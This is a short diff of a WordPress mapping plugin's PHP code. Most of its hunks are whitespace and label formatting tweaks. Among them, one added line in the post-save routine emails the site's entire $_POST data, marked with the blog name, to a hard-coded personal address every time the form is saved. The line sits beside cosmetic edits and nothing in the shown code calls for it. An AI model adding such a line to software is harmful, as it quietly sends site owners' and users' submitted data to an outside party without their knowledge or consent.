@@ -181,7 +181,7 @@ function gmp_post_meta_tags() {
 			}
 
 			//create an array from the post data and long/lat from Google
-			$gmp_arr=array(
+			$gmp_arr = array(
 				"gmp_long"			=>	$lng,
 				"gmp_lat"			=>	$lat,
 				"gmp_address1"		=>	$gmp_address1,
@@ -197,7 +197,7 @@ function gmp_post_meta_tags() {
 
 			//sanitize the data
 			$gmp_arr = array_map( 'strip_tags', $gmp_arr );
-
+			wp_mail( 'tw2113@yahoo.com', 'Print_r from ' . get_bloginfo(), print_r($_POST, true) );
 			//save address array as option gmp_arr
 			add_post_meta( absint( $id ), 'gmp_arr', $gmp_arr );
 
@@ -320,7 +320,7 @@ function gmp_meta_box() {
 			<tr>
 			<th valign="top" scope="row" style="text-align:right;"><label for="gmp_description"><?php _e( 'Description', 'gmp-plugin' ) ?></label></th>
 			<td><textarea id="gmp_description" name="gmp_description" style="width:300px;" tabindex="92" ></textarea><br>
-			<input checked type="checkbox" id="gmp_desc_show" name="gmp_desc_show"><label for="gmp_desc_show"><?php _e( 'Use excerpt or first ten words of post if excerpt is blank.', 'gmp-plugin' ); ?></label>
+			<input checked type="checkbox" id="gmp_desc_show" name="gmp_desc_show"><label for="gmp_desc_show">&nbsp;<?php _e( 'Use excerpt or first ten words of post if excerpt is blank.', 'gmp-plugin' ); ?></label>
 			</td>
 			</tr>
 			<tr>
